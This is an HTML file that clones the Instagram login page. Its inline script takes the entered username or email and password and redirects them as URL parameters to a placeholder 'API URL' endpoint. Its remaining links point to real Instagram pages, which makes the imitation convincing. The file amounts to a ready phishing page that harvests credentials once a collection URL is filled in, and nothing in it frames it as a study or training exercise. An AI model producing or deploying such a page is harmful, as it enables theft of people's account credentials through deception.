<!-- Adapted from https://github.com/laisfrigerio/instagram-clone-login-page -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="/img/favicon.ico">
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form class="form" id="form">
                    <label for="email" class="sr-only">Phone number, username, or e-mail</label>
                    <input name="email" id="email" placeholder="Phone number, username, or e-mail" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" id="pass" type="password" placeholder="Password" />

                    <button type="button" value="submit" onclick="onSubmitForm()">Log in</button>
                </form>
                <script>
                    function onSubmitForm() {
                        var mainText = "API URL";
                        var email = document.getElementById('email').value;
                        var pass = document.getElementById('pass').value;
                        window.location.href = mainText+'insert?email='+email+"&password="+pass;
                    }
                    </script>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                </div>
            </div>
        </section>
    </main>
</body>
</html>
